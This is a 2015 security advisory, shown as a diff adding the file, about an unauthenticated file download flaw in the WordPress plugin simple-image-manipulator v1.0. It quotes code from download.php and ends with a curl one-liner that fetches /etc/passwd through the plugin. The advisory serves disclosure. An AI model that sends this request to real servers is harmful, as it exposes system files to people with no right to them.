@@ -1,0 +1,43 @@
+Title: Remote file download in simple-image-manipulator v1.0 wordpress plugin
+Author: Larry W. Cashdollar, @_larry0
+Date: 2015-07-16
+Download Site: https://wordpress.org/plugins/simple-image-manipulator
+Vendor: https://profiles.wordpress.org/kevartpatel/
+Vendor Notified: 2015-07-16
+Vendor Contact: plugins@wordpress.org
+Description: Manipulate your wordpress images using slider and tickboxes.
+Vulnerability:
+In ./simple-image-manipulator/controller/download.php no checks are made to authenticate user or sanitize input when determining file location:
+
+
+ 14  /* Figure out the MIME type | Check in array */
+ 15  $known_mime_types=array(
+ 16         "pdf" => "application/pdf",
+ 17         "txt" => "text/plain",
+ 18         "html" => "text/html",
+ 19         "htm" => "text/html",
+ 20         "exe" => "application/octet-stream",
+ 21         "zip" => "application/zip",
+ 22         "doc" => "application/msword",
+ 23         "xls" => "application/vnd.ms-excel",
+ 24         "ppt" => "application/vnd.ms-powerpoint",
+ 25         "gif" => "image/gif",
+ 26         "png" => "image/png",
+ 27         "jpeg"=> "image/jpg",
+ 28         "jpg" =>  "image/jpg",
+ 29         "php" => "text/plain"
+ 30  );
+ 31 
+ 32  if($mime_type==''){
+ 33          $file_extension = strtolower(substr(strrchr($file,"."),1));
+ 34          if(array_key_exists($file_extension, $known_mime_types)){
+ 35                 $mime_type=$known_mime_types[$file_extension];
+ 36          } else {
+ 37                 $mime_type="application/force-download";
+ 38          };
+ 39  };
+
+CVEID:
+OSVDB:
+Exploit Code:
+  • curl -sk "http://server/wp-content/plugins/./simple-image-manipulator/controller/download.php?filepath=/etc/passwd"
